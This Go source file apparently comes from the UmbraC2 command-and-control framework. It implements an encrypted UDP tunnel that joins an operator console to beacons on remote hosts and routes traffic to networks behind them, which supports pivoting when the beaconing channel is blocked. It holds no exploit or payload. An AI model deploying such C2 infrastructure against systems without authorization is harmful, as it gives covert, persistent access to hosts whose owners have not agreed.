// Package vpn implements a WireGuard-style layer-3 tunnel between the
// operator console and the beacons.
//
// The tunnel is a transport of its own: its own UDP socket, its own key
// schedule and its own replay protection. That matters because it keeps
// working when the beaconing channel is blocked -- an operator can still reach
// a host that can only send UDP out.
//
// The handshake follows the Noise IK pattern in a compact form:
//
//	initiator -> responder   INIT  {id, timestamp, ephemeral, mac}
//	responder -> initiator   RESP  {timestamp, ephemeral, address, mac}
//
// Both MACs are HMAC-SHA256 over a domain-separated transcript keyed with a
// secret both sides know (the agent PSK or an operator token), so a peer that
// does not hold the secret cannot even finish the handshake, let alone derive
// the transport keys. The keys themselves come from an X25519 exchange mixed
// with that secret, so the tunnel keys are not derived from public data alone.
//
// Data packets are IPv4 packets encrypted with AES-256-GCM:
//
//	03 | counter (8, big endian) | ciphertext
//
// The 9-byte header is the AEAD associated data, the nonce is the 4-byte
// direction prefix followed by the counter, and every peer keeps a replay
// window of the last 64 counters.
package vpn

import (
	"encoding/binary"
	"errors"
	"fmt"
	"log/slog"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
	"github.com/thesyntax1/UmbraC2/server/internal/wire"
)

// Packet types.
const (
	TypeInit byte = 1
	TypeResp byte = 2
	TypeData byte = 3
	// TypePing and TypePong carry a question and an answer through the
	// tunnel.  They are sealed like the data packets, so only the peer
	// can read the question and only the server can tell that the answer
	// is the answer.
	TypePing byte = 4
	TypePong byte = 5
)

// Sizes.
const (
	// KeyLen is the length of a tunnel key.
	KeyLen = 32
	// NonceLen is the AEAD nonce length.
	NonceLen = 12
	// TagLen is the GCM tag length.
	TagLen = 16
	// HeaderLen is the length of the data packet header.
	HeaderLen = 9
	// MacLen is the length of the authentication tag of a handshake
	// packet.  The tag is the first bytes of an HMAC, so it is short
	// enough for a packet and long enough to be unforgeable.
	MacLen = 16
	// MaxPacket is the largest accepted datagram.
	MaxPacket = 1600
	// MaxPayload is the largest plaintext an IP packet may carry.
	MaxPayload = MaxPacket - HeaderLen - TagLen
	// MaxPeers bounds the peer table.
	MaxPeers = 256
	// MaxIdentityLen bounds the peer identity in an INIT packet.
	MaxIdentityLen = 64
	// ReplayWindow is how many past counters are remembered.
	ReplayWindow = 64
)

// Timeouts.
const (
	// HandshakeTimeout is how long a handshake may stay unanswered.
	HandshakeTimeout = 30 * time.Second
	// SessionTimeout is how long a peer may stay silent.
	SessionTimeout = 180 * time.Second
	// SweepInterval is how often stale peers are dropped.
	SweepInterval = 30 * time.Second
)

// Domain separation labels.
var (
	LabelInit = []byte("umbra/v1/vpn/init")
	LabelResp = []byte("umbra/v1/vpn/resp")
	LabelDH   = []byte("umbra/v1/vpn/dh")
)

// Errors.
var (
	ErrNoSuchPeer     = errors.New("vpn: no such peer")
	ErrCapacity       = errors.New("vpn: the peer table is full")
	ErrNoAddress      = errors.New("vpn: no free tunnel address")
	ErrBadPacket      = errors.New("vpn: malformed packet")
	ErrNoKey          = errors.New("vpn: no usable pre-shared key")
	ErrReplay         = errors.New("vpn: replayed packet")
	ErrNotEstablished = errors.New("vpn: the session is not established")
)

// Config configures the tunnel server.
type Config struct {
	// Listen is the UDP address to bind.
	Listen string
	// Network is the tunnel network in CIDR form, e.g. 10.77.0.0/24.
	Network string
	// AgentKeys are the pre-shared secrets the beacons may use.
	AgentKeys [][]byte
	// OperatorKeys are the pre-shared secrets the consoles may use.
	OperatorKeys [][]byte
}

// Peer is one tunnel participant.
type Peer struct {
	ID       string
	Addr     uint32
	Endpoint *net.UDPAddr
	Agent    bool

	mu          sync.Mutex
	sendKey     []byte
	recvKey     []byte
	sendPrefix  [4]byte
	recvPrefix  [4]byte
	counter     uint64
	highest     uint64
	replay      uint64
	established bool
	lastSeen    time.Time
	bytesIn     int64
	bytesOut    int64
	// pongs carries the answers of the peer to the questions of the
	// server.
	pongs chan time.Duration
}

// PeerInfo is the operator-visible view of a peer.
type PeerInfo struct {
	ID       string `json:"id"`
	Address  string `json:"address"`
	Endpoint string `json:"endpoint,omitempty"`
	Agent    bool   `json:"agent"`
	Live     bool   `json:"live"`
	BytesIn  int64  `json:"bytes_in"`
	BytesOut int64  `json:"bytes_out"`
	LastSeen string `json:"last_seen"`
}

// Server is the tunnel server.
type Server struct {
	cfg *config
	log *slog.Logger

	mu       sync.Mutex
	peers    map[string]*Peer
	byAddr   map[uint32]*Peer
	reserved map[string]uint32
	// routes are the networks that lie behind a peer.
	routes []*Route
	base   uint32
	mask   uint32
	next   uint32
	conn   *net.UDPConn
	closed bool
}

// config is the resolved configuration.
type config struct {
	listen  string
	network string
	base    uint32
	mask    uint32
	agent   [][]byte
	oper    [][]byte
}

// New creates a tunnel server.
func New(cfg Config, log *slog.Logger) (*Server, error) {
	if log == nil {
		log = slog.Default()
	}
	base, mask, err := parseNetwork(cfg.Network)
	if err != nil {
		return nil, err
	}
	if len(cfg.AgentKeys) == 0 && len(cfg.OperatorKeys) == 0 {
		return nil, ErrNoKey
	}
	if cfg.Listen == "" {
		cfg.Listen = "0.0.0.0:51820"
	}
	return &Server{
		cfg: &config{
			listen:  cfg.Listen,
			network: cfg.Network,
			base:    base,
			mask:    mask,
			agent:   cfg.AgentKeys,
			oper:    cfg.OperatorKeys,
		},
		log:      log,
		peers:    make(map[string]*Peer),
		byAddr:   make(map[uint32]*Peer),
		reserved: make(map[string]uint32),
		next:     base + 2, // .1 is the server itself
	}, nil
}

// Start binds the socket and serves in the background.
func (s *Server) Start() error {
	addr, err := net.ResolveUDPAddr("udp", s.cfg.listen)
	if err != nil {
		return fmt.Errorf("vpn: resolve %s: %w", s.cfg.listen, err)
	}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return fmt.Errorf("vpn: listen %s: %w", s.cfg.listen, err)
	}
	s.mu.Lock()
	s.conn = conn
	s.mu.Unlock()
	s.log.Info("vpn tunnel listening", "addr", conn.LocalAddr().String(), "network", s.cfg.network)

	go s.readLoop()
	go s.sweepLoop()
	return nil
}

// Close stops the server.
func (s *Server) Close() error {
	s.mu.Lock()
	if s.closed {
		s.mu.Unlock()
		return nil
	}
	s.closed = true
	conn := s.conn
	s.mu.Unlock()
	if conn != nil {
		return conn.Close()
	}
	return nil
}

// Network returns the tunnel network in CIDR form.
func (s *Server) Network() string { return s.cfg.network }

// Addr returns the bound UDP address.
func (s *Server) Addr() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.conn == nil {
		return s.cfg.listen
	}
	return s.conn.LocalAddr().String()
}

// broadcast is the last address of the tunnel network.
func (s *Server) broadcast() uint32 { return s.base | ^s.mask }

// Allocate reserves a tunnel address for an identity.
//
// The reservation is stable: an agent that is given an address keeps it, so
// firewall rules and routes do not have to follow the agent around.
func (s *Server) Allocate(id string) (net.IP, error) {
	if id == "" {
		return nil, errors.New("vpn: an identity is required")
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	if addr, ok := s.reserved[id]; ok {
		return u32ToIP(addr), nil
	}
	var addr uint32
	for i := 0; i < 1<<16; i++ {
		addr = s.next
		s.next++
		if s.next > s.broadcast() {
			s.next = s.base + 2
		}
		if s.takenLocked(addr) {
			continue
		}
		s.reserved[id] = addr
		return u32ToIP(addr), nil
	}
	return nil, ErrNoAddress
}

// takenLocked reports whether an address is already in use.
func (s *Server) takenLocked(addr uint32) bool {
	if _, ok := s.byAddr[addr]; ok {
		return true
	}
	for _, v := range s.reserved {
		if v == addr {
			return true
		}
	}
	return false
}

// Peers returns the peer table.
func (s *Server) Peers() []PeerInfo {
	s.mu.Lock()
	peers := make([]*Peer, 0, len(s.peers))
	for _, p := range s.peers {
		peers = append(peers, p)
	}
	// The reservations are peers that have an address but have not
	// joined yet.  The operator has to see them, because the rules that
	// point at the address are already in place.
	reserved := make([]PeerInfo, 0, len(s.reserved))
	for id, addr := range s.reserved {
		if _, joined := s.peers[id]; joined {
			continue
		}
		reserved = append(reserved, PeerInfo{
			ID:      id,
			Address: u32ToIP(addr).String(),
			Live:    false,
		})
	}
	s.mu.Unlock()
	out := make([]PeerInfo, 0, len(peers)+len(reserved))
	for _, p := range peers {
		out = append(out, p.info())
	}
	out = append(out, reserved...)
	return out
}

// Status returns a summary for the operator console.
func (s *Server) Status() map[string]any {
	s.mu.Lock()
	peers := make([]*Peer, 0, len(s.peers))
	for _, p := range s.peers {
		peers = append(peers, p)
	}
	reserved := len(s.reserved)
	routes := len(s.routes)
	addr := s.cfg.listen
	if s.conn != nil {
		addr = s.conn.LocalAddr().String()
	}
	s.mu.Unlock()

	live := 0
	for _, p := range peers {
		if p.live() {
			live++
		}
	}
	return map[string]any{
		"listening": addr,
		"network":   s.cfg.network,
		"peers":     len(peers),
		"live":      live,
		"reserved":  reserved,
		"routes":    routes,
	}
}

// readLoop reads datagrams until the socket is closed.
func (s *Server) readLoop() {
	buf := make([]byte, MaxPacket)
	for {
		n, addr, err := s.conn.ReadFromUDP(buf)
		if err != nil {
			s.mu.Lock()
			closed := s.closed
			s.mu.Unlock()
			if closed {
				return
			}
			continue
		}
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		go s.handle(pkt, addr)
	}
}

// handle processes one datagram.
func (s *Server) handle(pkt []byte, addr *net.UDPAddr) {
	if len(pkt) == 0 {
		return
	}
	switch pkt[0] {
	case TypeInit:
		s.handleInit(pkt, addr)
	case TypeData:
		s.handleData(pkt, addr)
	case TypePong:
		s.handlePong(pkt, addr)
	default:
		// Unknown types are ignored: a future protocol version must not be
		// able to crash the tunnel.
	}
}

// handleInit answers a handshake initiation.
func (s *Server) handleInit(pkt []byte, addr *net.UDPAddr) {
	// layout: type(1) idlen(1) id ts(8) eph(32) mac(16)
	if len(pkt) < 2+8+32+16 {
		return
	}
	idLen := int(pkt[1])
	offset := 2
	if idLen <= 0 || idLen > MaxIdentityLen || offset+idLen+8+32+16 > len(pkt) {
		return
	}
	id := string(pkt[offset : offset+idLen])
	offset += idLen
	ts := binary.BigEndian.Uint64(pkt[offset : offset+8])
	offset += 8
	eph := pkt[offset : offset+32]
	offset += 32
	mac := pkt[offset : offset+16]

	// The clock skew check keeps a captured INIT from being replayed later.
	if skew := time.Since(time.Unix(int64(ts), 0)); skew > HandshakeTimeout || skew < -HandshakeTimeout {
		return
	}
	key, isAgent, ok := s.matchMAC(id, ts, eph, mac)
	if !ok {
		s.log.Warn("vpn handshake refused", "id", id, "reason", "bad mac")
		return
	}

	s.mu.Lock()
	if len(s.peers) >= MaxPeers {
		if _, exists := s.peers[id]; !exists {
			s.mu.Unlock()
			return
		}
	}
	peer, exists := s.peers[id]
	if !exists {
		peer = &Peer{ID: id, pongs: make(chan time.Duration, 4)}
		s.peers[id] = peer
	}
	addrValue, reserved := s.reserved[id]
	if !reserved {
		addrValue = s.next
		s.next++
		if s.next > s.broadcast() {
			s.next = s.base + 2
		}
		s.reserved[id] = addrValue
	}
	if old, taken := s.byAddr[addrValue]; taken && old != peer {
		delete(s.byAddr, addrValue)
	}
	peer.Addr = addrValue
	peer.Endpoint = addr
	peer.Agent = isAgent
	s.byAddr[addrValue] = peer
	s.mu.Unlock()

	// Ephemeral exchange.
	priv, err := crypt.NewX25519Keypair()
	if err != nil {
		return
	}
	dh, err := priv.Shared(eph)
	if err != nil {
		return
	}
	shared := crypt.HMACSHA256(key, append(append([]byte{}, LabelDH...), dh...))
	now := time.Now().UTC()
	sn := make([]byte, 16)
	binary.BigEndian.PutUint64(sn[:8], uint64(now.Unix()))
	// The client nonce is the timestamp it sent; both are public, and the
	// transcript MAC already binds them to the shared secret.
	cn := make([]byte, 16)
	binary.BigEndian.PutUint64(cn[:8], ts)
	_, km, err := crypt.DeriveSession(shared, cn, sn)
	if err != nil {
		return
	}

	peer.mu.Lock()
	peer.sendKey = km.S2CKey
	peer.sendPrefix = [4]byte{km.S2CPrefix[0], km.S2CPrefix[1], km.S2CPrefix[2], km.S2CPrefix[3]}
	peer.recvKey = km.C2SKey
	peer.recvPrefix = [4]byte{km.C2SPrefix[0], km.C2SPrefix[1], km.C2SPrefix[2], km.C2SPrefix[3]}
	peer.counter = 0
	peer.highest = 0
	peer.replay = 0
	peer.established = true
	peer.lastSeen = now
	peer.mu.Unlock()

	resp := make([]byte, 0, 1+8+32+4+16)
	resp = append(resp, TypeResp)
	var tsBuf [8]byte
	binary.BigEndian.PutUint64(tsBuf[:], uint64(now.Unix()))
	resp = append(resp, tsBuf[:]...)
	resp = append(resp, priv.Pub...)
	var addrBuf [4]byte
	binary.BigEndian.PutUint32(addrBuf[:], addrValue)
	resp = append(resp, addrBuf[:]...)
	resp = append(resp, respMAC(key, id, ts, eph, priv.Pub, uint64(now.Unix()))...)
	if s.conn != nil {
		_, _ = s.conn.WriteToUDP(resp, addr)
	}
}

// handleData decrypts and forwards one data packet.
func (s *Server) handleData(pkt []byte, addr *net.UDPAddr) {
	if len(pkt) < HeaderLen+TagLen {
		return
	}
	header := pkt[:HeaderLen]
	counter := binary.BigEndian.Uint64(header[1:9])

	s.mu.Lock()
	var peer *Peer
	for _, p := range s.peers {
		if p.Endpoint != nil && p.Endpoint.String() == addr.String() {
			peer = p
			break
		}
	}
	s.mu.Unlock()
	if peer == nil {
		return
	}

	peer.mu.Lock()
	if !peer.established {
		peer.mu.Unlock()
		return
	}
	key := peer.recvKey
	prefix := peer.recvPrefix
	if !peer.acceptCounter(counter) {
		peer.mu.Unlock()
		return
	}
	peer.mu.Unlock()

	nonce := make([]byte, NonceLen)
	copy(nonce[:4], prefix[:])
	binary.BigEndian.PutUint64(nonce[4:], counter)
	plain, err := crypt.Open(wire.SuiteAES256GCM, key, nonce, header, pkt[HeaderLen:])
	if err != nil {
		return
	}
	if len(plain) < 20 || plain[0]>>4 != 4 {
		return
	}
	dst := binary.BigEndian.Uint32(plain[16:20])

	s.mu.Lock()
	target := s.byAddr[dst]
	var route *Route
	if target == nil {
		// The packet belongs to a network that lies behind one of the
		// peers: the peer is the gateway of it.
		target, route = s.routePeer(dst)
	}
	s.mu.Unlock()
	if target == nil || target == peer {
		return
	}
	if err := s.send(target, plain); err != nil {
		return
	}
	peer.mu.Lock()
	peer.bytesIn += int64(len(plain))
	peer.lastSeen = time.Now().UTC()
	peer.mu.Unlock()
	if route != nil {
		s.mu.Lock()
		route.Bytes += int64(len(plain))
		route.Packets++
		s.mu.Unlock()
	}
}

// send encrypts a payload for a peer and writes it out.
func (s *Server) send(peer *Peer, plain []byte) error {
	peer.mu.Lock()
	if !peer.established {
		peer.mu.Unlock()
		return ErrNotEstablished
	}
	counter := peer.counter
	peer.counter++
	key := peer.sendKey
	prefix := peer.sendPrefix
	peer.mu.Unlock()

	header := make([]byte, HeaderLen)
	header[0] = TypeData
	binary.BigEndian.PutUint64(header[1:9], counter)
	nonce := make([]byte, NonceLen)
	copy(nonce[:4], prefix[:])
	binary.BigEndian.PutUint64(nonce[4:], counter)
	sealed, err := crypt.Seal(wire.SuiteAES256GCM, key, nonce, header, plain)
	if err != nil {
		return err
	}
	out := append(header, sealed...)
	if peer.Endpoint == nil || s.conn == nil {
		return ErrNotEstablished
	}
	if _, err := s.conn.WriteToUDP(out, peer.Endpoint); err != nil {
		return err
	}
	peer.mu.Lock()
	peer.bytesOut += int64(len(plain))
	peer.lastSeen = time.Now().UTC()
	peer.mu.Unlock()
	return nil
}

// sweepLoop drops peers that stopped talking.
func (s *Server) sweepLoop() {
	ticker := time.NewTicker(SweepInterval)
	defer ticker.Stop()
	for range ticker.C {
		cutoff := time.Now().UTC().Add(-SessionTimeout)
		s.mu.Lock()
		for id, p := range s.peers {
			p.mu.Lock()
			stale := p.lastSeen.Before(cutoff)
			p.mu.Unlock()
			if stale {
				delete(s.peers, id)
				if p.Addr != 0 {
					delete(s.byAddr, p.Addr)
				}
				s.log.Info("vpn peer expired", "id", id)
			}
		}
		s.mu.Unlock()
	}
}

// matchMAC finds the pre-shared secret that authenticates an INIT packet.
//
// The agent PSK identifies every beacon and an operator token identifies one
// console; both are accepted, so a console joins the tunnel with the same
// credential it uses for everything else.
func (s *Server) matchMAC(id string, ts uint64, eph, mac []byte) ([]byte, bool, bool) {
	for _, key := range s.cfg.agent {
		if len(key) == 0 {
			continue
		}
		if crypt.ConstantTimeEq(initMAC(key, id, ts, eph), mac) {
			return key, true, true
		}
	}
	for _, key := range s.cfg.oper {
		if len(key) == 0 {
			continue
		}
		if crypt.ConstantTimeEq(initMAC(key, id, ts, eph), mac) {
			return key, false, true
		}
	}
	return nil, false, false
}

// initMAC builds the authentication tag of an INIT packet.
//
// The tag is the first sixteen bytes of the HMAC: a tag that short is
// still unforgeable, and the packet stays small.
func initMAC(key []byte, id string, ts uint64, eph []byte) []byte {
	msg := make([]byte, 0, len(LabelInit)+len(id)+8+32)
	msg = append(msg, LabelInit...)
	msg = append(msg, id...)
	var tsBuf [8]byte
	binary.BigEndian.PutUint64(tsBuf[:], ts)
	msg = append(msg, tsBuf[:]...)
	msg = append(msg, eph...)
	return crypt.HMACSHA256(key, msg)[:MacLen]
}

// respMAC builds the authentication tag of a RESP packet.
func respMAC(key []byte, id string, ts uint64, eph, respEph []byte, now uint64) []byte {
	msg := make([]byte, 0, len(LabelResp)+len(id)+8+32+32+8)
	msg = append(msg, LabelResp...)
	msg = append(msg, id...)
	var tsBuf [8]byte
	binary.BigEndian.PutUint64(tsBuf[:], ts)
	msg = append(msg, tsBuf[:]...)
	msg = append(msg, eph...)
	msg = append(msg, respEph...)
	binary.BigEndian.PutUint64(tsBuf[:], now)
	msg = append(msg, tsBuf[:]...)
	return crypt.HMACSHA256(key, msg)[:MacLen]
}

// acceptCounter implements the replay window.
//
// The caller holds the peer lock. It returns false for a counter that was
// already seen or that is too far behind the highest one seen, which is
// exactly the replay and reordering case a tunnel has to reject.
func (p *Peer) acceptCounter(counter uint64) bool {
	if counter > p.highest {
		shift := counter - p.highest
		if shift >= ReplayWindow {
			p.replay = 0
		} else {
			p.replay <<= shift
		}
		p.highest = counter
		return true
	}
	diff := p.highest - counter
	if diff >= ReplayWindow {
		return false
	}
	mask := uint64(1) << diff
	if p.replay&mask != 0 {
		return false
	}
	p.replay |= mask
	return true
}

// live reports whether the peer talked recently.
func (p *Peer) live() bool {
	p.mu.Lock()
	defer p.mu.Unlock()
	if !p.established {
		return false
	}
	return time.Since(p.lastSeen) < SessionTimeout
}

// info snapshots the peer.
func (p *Peer) info() PeerInfo {
	p.mu.Lock()
	defer p.mu.Unlock()
	endpoint := ""
	if p.Endpoint != nil {
		endpoint = p.Endpoint.String()
	}
	return PeerInfo{
		ID:       p.ID,
		Address:  u32ToIP(p.Addr).String(),
		Endpoint: endpoint,
		Agent:    p.Agent,
		Live:     p.established && time.Since(p.lastSeen) < SessionTimeout,
		BytesIn:  p.bytesIn,
		BytesOut: p.bytesOut,
		LastSeen: p.lastSeen.UTC().Format(time.RFC3339),
	}
}

// parseNetwork converts a CIDR into a base address and a mask.
func parseNetwork(cidr string) (uint32, uint32, error) {
	if cidr == "" {
		cidr = "10.77.0.0/24"
	}
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return 0, 0, fmt.Errorf("vpn: parse network %q: %w", cidr, err)
	}
	ones, bits := ipnet.Mask.Size()
	if bits != 32 || ones < 8 || ones > 30 {
		return 0, 0, fmt.Errorf("vpn: unsupported network %q", cidr)
	}
	mask := uint32(0xFFFFFFFF) << uint(32-ones)
	return ipToU32(ip.Mask(ipnet.Mask)), mask, nil
}

// ipToU32 converts an IPv4 address to its numeric form.
func ipToU32(ip net.IP) uint32 {
	v4 := ip.To4()
	if v4 == nil {
		return 0
	}
	return binary.BigEndian.Uint32(v4)
}

// u32ToIP converts a numeric address back to net.IP.
func u32ToIP(v uint32) net.IP {
	ip := make(net.IP, 4)
	binary.BigEndian.PutUint32(ip, v)
	return ip
}

// Describe renders a peer address for logs.
func (p *Peer) Describe() string {
	return p.ID + " (" + u32ToIP(p.Addr).String() + ")"
}

// String renders the tunnel network.
func (s *Server) String() string {
	return "vpn " + s.cfg.network + " on " + s.Addr()
}

// ParseAddress splits a host:port pair.
func ParseAddress(addr string) (string, int, error) {
	host, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		return "", 0, fmt.Errorf("vpn: address %q: %w", addr, err)
	}
	port, err := strconv.Atoi(portStr)
	if err != nil || port <= 0 || port > 65535 {
		return "", 0, fmt.Errorf("vpn: address %q: bad port", addr)
	}
	return host, port, nil
}

// NormalisePeerID trims a peer identity.
func NormalisePeerID(id string) string {
	return strings.TrimSpace(id)
}
